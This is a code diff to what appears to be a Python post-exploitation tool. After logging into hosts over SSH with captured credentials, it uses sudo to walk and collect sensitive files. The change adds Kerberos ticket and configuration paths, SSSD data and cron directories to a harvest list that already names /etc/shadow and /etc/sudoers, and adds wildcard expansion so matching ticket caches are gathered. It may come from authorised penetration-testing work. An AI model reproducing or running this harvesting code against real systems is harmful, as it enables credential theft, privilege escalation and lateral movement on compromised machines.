@@ -19,7 +19,7 @@ from typing import Tuple
 
 import paramiko
 
-from .exploit import get_directory, get_file, run_command, run_sudo
+from .exploit import get_directory, get_file, run_command, run_sudo, expand_wildcard
 from .models import Credential, File
 
 logger = logging.getLogger(__name__)
@@ -27,10 +27,24 @@ logger = logging.getLogger(__name__)
 # Sensitive files to find on systems. Paths
 # ending in / are directories.
 SENSITIVE_FILES = [
+    # Authentication
     '/etc/passwd',
     '/etc/shadow',
     '/etc/sudoers',
     '/etc/sudoers.d/',
+
+    # Kerberos
+    '/tmp/krb*',
+    '/etc/krb*',
+    '/etc/sssd/',
+
+    # Cron
+    '/etc/crontab',
+    '/etc/cron.d/',
+    '/etc/cron.daily/',
+    '/etc/cron.hourly/',
+    '/etc/cron.monthly/',
+    '/etc/cron.weekly/',
 ]
 
 
@@ -66,10 +80,19 @@ def post_ssh(ssh: paramiko.SSHClient, credential: Credential):
     while len(queue):
         path = queue.pop()
 
+        # Path is a directory
         if path[-1] == '/':
             directory = get_directory(ssh, path, sudo)
             if directory:
                 queue.extend(map(lambda x: os.path.join(path, x.strip()), directory))
+
+        # Path is a wildcard
+        elif '*' in path:
+            files = expand_wildcard(ssh, path, sudo)
+            if files:
+                queue.extend(map(lambda x: x.strip(), files))
+
+        # Path should be a file
         else:
             if File.select().where(File.service == credential.service, File.path == path).count() >= 1:
                 continue
